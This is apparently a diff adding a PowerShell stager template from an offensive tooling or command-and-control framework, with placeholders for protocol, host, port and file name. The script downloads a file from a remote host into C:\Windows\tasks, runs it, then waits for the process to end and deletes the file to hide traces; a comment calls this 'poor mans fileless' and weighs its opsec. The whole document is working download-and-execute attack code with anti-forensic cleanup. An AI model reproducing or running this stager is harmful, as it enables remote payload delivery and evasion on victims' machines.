@@ -1,0 +1,20 @@
+$path = "C:\Windows\tasks"
+$wc = New-Object net.webclient
+$wc.Downloadfile("{{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}", "$path\{{.Name}}")
+$baseFileName = "{{.Name}}"
+$fullPath = "$path\{{.Name}}"
+$processName = [System.IO.Path]::GetFileNameWithoutExtension($baseFileName)
+Set-ItemProperty -Path "$path\{{.Name}}" -Name IsReadOnly -Value $false
+Start-Process -Filepath "$path\{{.Name}}"
+# poor mans fileless and arguable not very opsec friendly...
+while ($true) {
+    $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
+    if (-not $process) {
+        if (Test-Path $fullPath) {
+            Remove-Item $fullPath -Force
+        }
+        break
+    }
+    Start-Sleep -Seconds 5
+}
+
